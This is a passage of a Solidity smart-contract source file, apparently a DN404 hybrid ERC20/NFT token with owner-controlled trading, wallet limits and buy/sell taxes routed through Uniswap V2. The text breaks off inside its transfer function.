{"SourceCode": "{\"DN404.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\n\\r\\ninterface IUniswapV2Router02 {\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint amountTokenDesired,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    )\\r\\n        external\\r\\n        payable\\r\\n        returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n}\\r\\n\\r\\n/// @title DN404\\r\\n/// @notice DN404 is a hybrid ERC20 and ERC721 implementation that mints\\r\\n/// and burns NFTs based on an account\\u0027s ERC20 token balance.\\r\\n///\\r\\n/// @author vectorized.eth (@optimizoor)\\r\\n/// @author Quit (@0xQuit)\\r\\n/// @author Michael Amadi (@AmadiMichaels)\\r\\n/// @author cygaar (@0xCygaar)\\r\\n/// @author Thomas (@0xjustadev)\\r\\n/// @author Harrison (@PopPunkOnChain)\\r\\n///\\r\\n/// @dev Note:\\r\\n/// - The ERC721 data is stored in this base DN404 contract, however a\\r\\n///   DN404Mirror contract ***MUST*** be deployed and linked during\\r\\n///   initialization.\\r\\nabstract contract DN404 {\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                           EVENTS                           */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Emitted when `amount` tokens is transferred from `from` to `to`.\\r\\n    event Transfer(address indexed from, address indexed to, uint256 amount);\\r\\n\\r\\n    /// @dev Emitted when `amount` tokens is approved by `owner` to be used by `spender`.\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 amount\\r\\n    );\\r\\n\\r\\n    /// @dev Emitted when `target` sets their skipNFT flag to `status`.\\r\\n    event SkipNFTSet(address indexed target, bool status);\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                        CUSTOM ERRORS                       */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Thrown when attempting to double-initialize the contract.\\r\\n    error DNAlreadyInitialized();\\r\\n\\r\\n    /// @dev Thrown when attempting to transfer or burn more tokens than sender\\u0027s balance.\\r\\n    error InsufficientBalance();\\r\\n\\r\\n    error MaxBalanceExceeded();\\r\\n    error TradingNotActive();\\r\\n\\r\\n    /// @dev Thrown when a spender attempts to transfer tokens with an insufficient allowance.\\r\\n    error InsufficientAllowance();\\r\\n\\r\\n    /// @dev Thrown when minting an amount of tokens that would overflow the max tokens.\\r\\n    error TotalSupplyOverflow();\\r\\n\\r\\n    /// @dev Thrown when the caller for a fallback NFT function is not the mirror contract.\\r\\n    error SenderNotMirror();\\r\\n\\r\\n    /// @dev Thrown when attempting to transfer tokens to the zero address.\\r\\n    error TransferToZeroAddress();\\r\\n\\r\\n    /// @dev Thrown when the mirror address provided for initialization is the zero address.\\r\\n    error MirrorAddressIsZero();\\r\\n\\r\\n    /// @dev Thrown when the link call to the mirror contract reverts.\\r\\n    error LinkMirrorContractFailed();\\r\\n\\r\\n    /// @dev Thrown when setting an NFT token approval\\r\\n    /// and the caller is not the owner or an approved operator.\\r\\n    error ApprovalCallerNotOwnerNorApproved();\\r\\n\\r\\n    /// @dev Thrown when transferring an NFT\\r\\n    /// and the caller is not the owner or an approved operator.\\r\\n    error TransferCallerNotOwnerNorApproved();\\r\\n\\r\\n    /// @dev Thrown when transferring an NFT and the from address is not the current owner.\\r\\n    error TransferFromIncorrectOwner();\\r\\n\\r\\n    /// @dev Thrown when checking the owner or approved address for an non-existent NFT.\\r\\n    error TokenDoesNotExist();\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                         CONSTANTS                          */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    IUniswapV2Router02 internal constant UNISWAP_V2_ROUTER =\\r\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n\\r\\n    /// @dev Amount of token balance that is equal to one NFT.\\r\\n    uint256 internal constant _WAD = 10 ** 18;\\r\\n\\r\\n    /// @dev The maximum token ID allowed for an NFT.\\r\\n    uint256 internal constant _MAX_TOKEN_ID = 0xffffffff;\\r\\n\\r\\n    /// @dev The maximum possible token supply.\\r\\n    uint256 internal constant _MAX_SUPPLY = 10 ** 18 * 0xffffffff - 1;\\r\\n\\r\\n    /// @dev The flag to denote that the address data is initialized.\\r\\n    uint8 internal constant _ADDRESS_DATA_INITIALIZED_FLAG = 1 \\u003c\\u003c 0;\\r\\n\\r\\n    /// @dev The flag to denote that the address should skip NFTs.\\r\\n    uint8 internal constant _ADDRESS_DATA_SKIP_NFT_FLAG = 1 \\u003c\\u003c 1;\\r\\n\\r\\n    uint8 internal constant _ADDRESS_DATA_EXCLUDED_FROM_FEE_FLAG = 1 \\u003c\\u003c 2;\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                          STORAGE                           */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Struct containing an address\\u0027s token data and settings.\\r\\n    struct AddressData {\\r\\n        // Auxiliary data.\\r\\n        uint88 aux;\\r\\n        // Flags for `initialized` and `skipNFT`.\\r\\n        uint8 flags;\\r\\n        // The alias for the address. Zero means absence of an alias.\\r\\n        uint32 addressAlias;\\r\\n        // The number of NFT tokens.\\r\\n        uint32 ownedLength;\\r\\n        // The token balance in wei.\\r\\n        uint96 balance;\\r\\n    }\\r\\n\\r\\n    /// @dev A uint32 map in storage.\\r\\n    struct Uint32Map {\\r\\n        mapping(uint256 =\\u003e uint256) map;\\r\\n    }\\r\\n\\r\\n    /// @dev Struct containing the base token contract storage.\\r\\n    struct DN404Storage {\\r\\n        bool limits;\\r\\n        bool tradingEnabled;\\r\\n        uint256 maxTokensAmountPerWallet;\\r\\n        address owner;\\r\\n        address taxReceiver;\\r\\n        uint256 taxBuy;\\r\\n        uint256 taxSell;\\r\\n        uint256 taxSwapThreeshold;\\r\\n        address pair;\\r\\n        bool inSwap;\\r\\n        bool swapEnabled;\\r\\n        // Current number of address aliases assigned.\\r\\n        uint32 numAliases;\\r\\n        // Next token ID to assign for an NFT mint.\\r\\n        uint32 nextTokenId;\\r\\n        // Total supply of minted NFTs.\\r\\n        uint32 totalNFTSupply;\\r\\n        // Total supply of tokens.\\r\\n        uint96 totalSupply;\\r\\n        // Address of the NFT mirror contract.\\r\\n        address mirrorERC721;\\r\\n        // Mapping of a user alias number to their address.\\r\\n        mapping(uint32 =\\u003e address) aliasToAddress;\\r\\n        // Mapping of user operator approvals for NFTs.\\r\\n        mapping(address =\\u003e mapping(address =\\u003e bool)) operatorApprovals;\\r\\n        // Mapping of NFT token approvals to approved operators.\\r\\n        mapping(uint256 =\\u003e address) tokenApprovals;\\r\\n        // Mapping of user allowances for token spenders.\\r\\n        mapping(address =\\u003e mapping(address =\\u003e uint256)) allowance;\\r\\n        // Mapping of NFT token IDs owned by an address.\\r\\n        mapping(address =\\u003e Uint32Map) owned;\\r\\n        // Even indices: owner aliases. Odd indices: owned indices.\\r\\n        Uint32Map oo;\\r\\n        // Mapping of user account AddressData\\r\\n        mapping(address =\\u003e AddressData) addressData;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns a storage pointer for DN404Storage.\\r\\n    function _getDN404Storage()\\r\\n        internal\\r\\n        pure\\r\\n        virtual\\r\\n        returns (DN404Storage storage $)\\r\\n    {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            // `uint72(bytes9(keccak256(\\\"DN404_STORAGE\\\")))`.\\r\\n            $.slot := 0xa20d6e21d0e5255308 // Truncate to 9 bytes to reduce bytecode size.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                         INITIALIZER                        */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Initializes the DN404 contract with an\\r\\n    /// `initialTokenSupply`, `initialTokenOwner` and `mirror` NFT contract address.\\r\\n    function _initializeDN404(\\r\\n        uint256 initialTokenSupply,\\r\\n        address initialSupplyOwner,\\r\\n        address mirror\\r\\n    ) internal virtual {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        if ($.nextTokenId != 0) revert DNAlreadyInitialized();\\r\\n\\r\\n        if (mirror == address(0)) revert MirrorAddressIsZero();\\r\\n        _linkMirrorContract(mirror);\\r\\n\\r\\n        $.tradingEnabled = true;\\r\\n        $.limits = false;\\r\\n        $.maxTokensAmountPerWallet = 0;\\r\\n        $.owner = initialSupplyOwner;\\r\\n        $.taxReceiver = address(0);\\r\\n        $.taxBuy = 0;\\r\\n        $.taxSell = 0;\\r\\n        $.taxSwapThreeshold = 0;\\r\\n        $.pair = address(0);\\r\\n        $.inSwap = false;\\r\\n        $.swapEnabled = false;\\r\\n        $.nextTokenId = 1;\\r\\n        $.mirrorERC721 = mirror;\\r\\n\\r\\n        if (initialTokenSupply \\u003e 0) {\\r\\n            if (initialSupplyOwner == address(0))\\r\\n                revert TransferToZeroAddress();\\r\\n            if (initialTokenSupply \\u003e _MAX_SUPPLY) revert TotalSupplyOverflow();\\r\\n\\r\\n            $.totalSupply = uint96(initialTokenSupply);\\r\\n            AddressData storage initialOwnerAddressData = _addressData(\\r\\n                initialSupplyOwner\\r\\n            );\\r\\n            initialOwnerAddressData.balance = uint96(initialTokenSupply);\\r\\n\\r\\n            emit Transfer(address(0), initialSupplyOwner, initialTokenSupply);\\r\\n\\r\\n            _setSkipNFT(initialSupplyOwner, true);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*               METADATA FUNCTIONS TO OVERRIDE               */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the name of the token.\\r\\n    function name() public view virtual returns (string memory);\\r\\n\\r\\n    /// @dev Returns the symbol of the token.\\r\\n    function symbol() public view virtual returns (string memory);\\r\\n\\r\\n    /// @dev Returns the Uniform Resource Identifier (URI) for token `id`.\\r\\n    function tokenURI(uint256 id) public view virtual returns (string memory);\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                      ERC20 OPERATIONS                      */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the decimals places of the token. Always 18.\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the amount of tokens in existence.\\r\\n    function totalSupply() public view virtual returns (uint256) {\\r\\n        return uint256(_getDN404Storage().totalSupply);\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the amount of tokens owned by `owner`.\\r\\n    function balanceOf(address owner) public view virtual returns (uint256) {\\r\\n        return _getDN404Storage().addressData[owner].balance;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the amount of tokens that `spender` can spend on behalf of `owner`.\\r\\n    function allowance(\\r\\n        address owner,\\r\\n        address spender\\r\\n    ) public view returns (uint256) {\\r\\n        return _getDN404Storage().allowance[owner][spender];\\r\\n    }\\r\\n\\r\\n    /// @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\r\\n    ///\\r\\n    /// Emits a {Approval} event.\\r\\n    function approve(\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) public virtual returns (bool) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        $.allowance[msg.sender][spender] = amount;\\r\\n\\r\\n        emit Approval(msg.sender, spender, amount);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /// @dev Transfer `amount` tokens from the caller to `to`.\\r\\n    ///\\r\\n    /// Will burn sender NFTs if balance after transfer is less than\\r\\n    /// the amount required to support the current NFT balance.\\r\\n    ///\\r\\n    /// Will mint NFTs to `to` if the recipient\\u0027s new balance supports\\r\\n    /// additional NFTs ***AND*** the `to` address\\u0027s skipNFT flag is\\r\\n    /// set to false.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - `from` must at least have `amount`.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function transfer(\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) public virtual returns (bool) {\\r\\n        _transfer(msg.sender, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /// @dev Transfers `amount` tokens from `from` to `to`.\\r\\n    ///\\r\\n    /// Note: Does not update the allowance if it is the maximum uint256 value.\\r\\n    ///\\r\\n    /// Will burn sender NFTs if balance after transfer is less than\\r\\n    /// the amount required to support the current NFT balance.\\r\\n    ///\\r\\n    /// Will mint NFTs to `to` if the recipient\\u0027s new balance supports\\r\\n    /// additional NFTs ***AND*** the `to` address\\u0027s skipNFT flag is\\r\\n    /// set to false.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - `from` must at least have `amount`.\\r\\n    /// - The caller must have at least `amount` of allowance to transfer the tokens of `from`.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) public virtual returns (bool) {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        uint256 allowed = $.allowance[from][msg.sender];\\r\\n\\r\\n        if (allowed != type(uint256).max) {\\r\\n            if (amount \\u003e allowed) revert InsufficientAllowance();\\r\\n            unchecked {\\r\\n                $.allowance[from][msg.sender] = allowed - amount;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        _transfer(from, to, amount);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                  INTERNAL MINT FUNCTIONS                   */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Mints `amount` tokens to `to`, increasing the total supply.\\r\\n    ///\\r\\n    /// Will mint NFTs to `to` if the recipient\\u0027s new balance supports\\r\\n    /// additional NFTs ***AND*** the `to` address\\u0027s skipNFT flag is\\r\\n    /// set to false.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function _mint(address to, uint256 amount) internal virtual {\\r\\n        if (to == address(0)) revert TransferToZeroAddress();\\r\\n\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        AddressData storage toAddressData = _addressData(to);\\r\\n\\r\\n        unchecked {\\r\\n            uint256 currentTokenSupply = uint256($.totalSupply) + amount;\\r\\n            if (amount \\u003e _MAX_SUPPLY || currentTokenSupply \\u003e _MAX_SUPPLY) {\\r\\n                revert TotalSupplyOverflow();\\r\\n            }\\r\\n            $.totalSupply = uint96(currentTokenSupply);\\r\\n\\r\\n            uint256 toBalance = toAddressData.balance + amount;\\r\\n            toAddressData.balance = uint96(toBalance);\\r\\n\\r\\n            if (toAddressData.flags \\u0026 _ADDRESS_DATA_SKIP_NFT_FLAG == 0) {\\r\\n                Uint32Map storage toOwned = $.owned[to];\\r\\n                uint256 toIndex = toAddressData.ownedLength;\\r\\n                uint256 toEnd = toBalance / _WAD;\\r\\n                _PackedLogs memory packedLogs = _packedLogsMalloc(\\r\\n                    _zeroFloorSub(toEnd, toIndex)\\r\\n                );\\r\\n\\r\\n                if (packedLogs.logs.length != 0) {\\r\\n                    uint256 maxNFTId = $.totalSupply / _WAD;\\r\\n                    uint32 toAlias = _registerAndResolveAlias(\\r\\n                        toAddressData,\\r\\n                        to\\r\\n                    );\\r\\n                    uint256 id = $.nextTokenId;\\r\\n                    $.totalNFTSupply += uint32(packedLogs.logs.length);\\r\\n                    toAddressData.ownedLength = uint32(toEnd);\\r\\n                    // Mint loop.\\r\\n                    do {\\r\\n                        while (_get($.oo, _ownershipIndex(id)) != 0) {\\r\\n                            if (++id \\u003e maxNFTId) id = 1;\\r\\n                        }\\r\\n                        _set(toOwned, toIndex, uint32(id));\\r\\n                        _setOwnerAliasAndOwnedIndex(\\r\\n                            $.oo,\\r\\n                            id,\\r\\n                            toAlias,\\r\\n                            uint32(toIndex++)\\r\\n                        );\\r\\n                        _packedLogsAppend(packedLogs, to, id, 0);\\r\\n                        if (++id \\u003e maxNFTId) id = 1;\\r\\n                    } while (toIndex != toEnd);\\r\\n                    $.nextTokenId = uint32(id);\\r\\n                    _packedLogsSend(packedLogs, $.mirrorERC721);\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        emit Transfer(address(0), to, amount);\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                  INTERNAL BURN FUNCTIONS                   */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Burns `amount` tokens from `from`, reducing the total supply.\\r\\n    ///\\r\\n    /// Will burn sender NFTs if balance after transfer is less than\\r\\n    /// the amount required to support the current NFT balance.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function _burn(address from, uint256 amount) internal virtual {\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        AddressData storage fromAddressData = _addressData(from);\\r\\n\\r\\n        uint256 fromBalance = fromAddressData.balance;\\r\\n        if (amount \\u003e fromBalance) revert InsufficientBalance();\\r\\n\\r\\n        uint256 currentTokenSupply = $.totalSupply;\\r\\n\\r\\n        unchecked {\\r\\n            fromBalance -= amount;\\r\\n            fromAddressData.balance = uint96(fromBalance);\\r\\n            currentTokenSupply -= amount;\\r\\n            $.totalSupply = uint96(currentTokenSupply);\\r\\n\\r\\n            Uint32Map storage fromOwned = $.owned[from];\\r\\n            uint256 fromIndex = fromAddressData.ownedLength;\\r\\n            uint256 nftAmountToBurn = _zeroFloorSub(\\r\\n                fromIndex,\\r\\n                fromBalance / _WAD\\r\\n            );\\r\\n\\r\\n            if (nftAmountToBurn != 0) {\\r\\n                $.totalNFTSupply -= uint32(nftAmountToBurn);\\r\\n\\r\\n                _PackedLogs memory packedLogs = _packedLogsMalloc(\\r\\n                    nftAmountToBurn\\r\\n                );\\r\\n\\r\\n                uint256 fromEnd = fromIndex - nftAmountToBurn;\\r\\n                // Burn loop.\\r\\n                do {\\r\\n                    uint256 id = _get(fromOwned, --fromIndex);\\r\\n                    _setOwnerAliasAndOwnedIndex($.oo, id, 0, 0);\\r\\n                    delete $.tokenApprovals[id];\\r\\n                    _packedLogsAppend(packedLogs, from, id, 1);\\r\\n                } while (fromIndex != fromEnd);\\r\\n\\r\\n                fromAddressData.ownedLength = uint32(fromIndex);\\r\\n                _packedLogsSend(packedLogs, $.mirrorERC721);\\r\\n            }\\r\\n        }\\r\\n        emit Transfer(from, address(0), amount);\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                INTERNAL TRANSFER FUNCTIONS                 */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Moves `amount` of tokens from `from` to `to`.\\r\\n    ///\\r\\n    /// Will burn sender NFTs if balance after transfer is less than\\r\\n    /// the amount required to support the current NFT balance.\\r\\n    ///\\r\\n    /// Will mint NFTs to `to` if the recipient\\u0027s new balance supports\\r\\n    /// additional NFTs ***AND*** the `to` address\\u0027s skipNFT flag is\\r\\n    /// set to false.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        if (to == address(0)) revert TransferToZeroAddress();\\r\\n\\r\\n        DN404Storage storage $ = _getDN404Storage();\\r\\n\\r\\n        AddressData storage fromAddressData = _addressData(from);\\r\\n        AddressData storage toAddressData = _addressData(to);\\r\\n\\r\\n        _TransferTemps memory t;\\r\\n        t.fromOwnedLength = fromAddressData.ownedLength;\\r\\n        t.toOwnedLength = toAddressData.ownedLength;\\r\\n        t.fromBalance = fromAddressData.balance;\\r\\n\\r\\n        if (amount \\u003e t.fromBalance) revert InsufficientBalance();\\r\\n\\r\\n        if (!$.tradingEnabled \\u0026\\u0026 from != $.owner \\u0026\\u0026 to != $.owner)\\r\\n            revert TradingNotActive();\\r\\n\\r\\n        unchecked {\\r\\n            t.fromBalance -= amount;\\r\\n        }\\r\\n\\r\\n        // Taxes\\r\\n        uint256 taxAmount = 0;\\r\\n        if (\\r\\n            $.tradingEnabled \\u0026\\u0026\\r\\n            $.taxBuy \\u003e 0 \\u0026\\u0026\\r\\n            from == $.pair \\u0026\\u0026\\r\\n            to != address(UNISWAP_V2_ROUTER) \\u0026\\u0026\\r\\n            toAddressData.flags \\u0026 _ADDRESS_DATA_EXCLUDED_FROM_FEE_FLAG == 0\\r\\n        ) {\\r\\n            taxAmount = (amount * $.taxBuy) / 100;\\r\\n        }\\r\\n        if (\\r\\n            $.tradingEnabled \\u0026\\u0026\\r\\n            $.taxSell \\u003e 0 \\u0026\\u0026\\r\\n            to == $.pair \\u0026\\u0026\\r\\n            from != address(this)\\r\\n        ) {\\r\\n            taxAmount = (amount * $.taxSell) / 100;\\r\\n        }\\r\\n\\r\\n        if (taxAmount \\u003e 0) {\\r\\n            AddressData storage contractData = _addressData(address(this));\\r\\n            contractData.balance = uint96(contractData.balance + taxAmount);\\r\\n            amount -= taxAmount;\\r\\n\\r\\n            uint256 contractTokenBalance = balanceOf(address(this));\\r\\n            if (\\r\\n                !$.inSwap \\u0026\\u0026\\r\\n                to == $.pair \\u0026\\u0026\\r\\n                $.swapEnabled \\u0026\\u0026\\r\\n                contractTokenBalance \\u003e $.taxSwapThreeshold\\r\\n            ) {\\r\\n                if (amount \\u003e= $.taxSwapThreeshold) {\\r\\n                    swapTokensForEth($.taxSwapThreeshold);\\r\\n                } else {\\r\\n                    swapTokensForEth(amount);\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n\\r\\n        unchecked {\\r\\n            fromAddressData.balance = uint96(t.fromBalance);\\r\\n            toAddressData.balance = uint96(\\r\\n                t.toBalance = toAddressData.balance + amount\\r\\n            );\\r\\n\\r\\n            if ($.limits) {\\r\\n                if (toAddressData.balance / _WAD \\u003e $.maxTokensAmountPerWallet) {\\r\\n                    revert MaxBalanceExceeded();\\r\\n                }\\r\\n            }\\r\\n\\r\\n            t.nftAmountToBurn = _zeroFloorSub(\\r\\n                t.fromOwnedLength,\\r\\n                t.fromBalance / _WAD\\r\\n            );\\r\\n\\r\\n            if (toAddressData.flags \\u0026 _ADDRESS_DATA_SKIP_NFT_FLAG == 0) {\\r\\n                if (from == to)\\r\\n                    t.toOwnedLength = t.fromOwnedLength - t.nftAmountToBurn;\\r\\n                t.nftAmountToMint = _zeroFloorSub(\\r\\n                    t.toBalance / _WAD,\\r\\n                    t.toOwnedLength\\r\\n                );\\r\\n            }\\r\\n\\r\\n            _PackedLogs memory packedLogs = _packedLogsMalloc(\\r\\n                t.nftAmountToBurn + t.nftAmountToMint\\r\\n            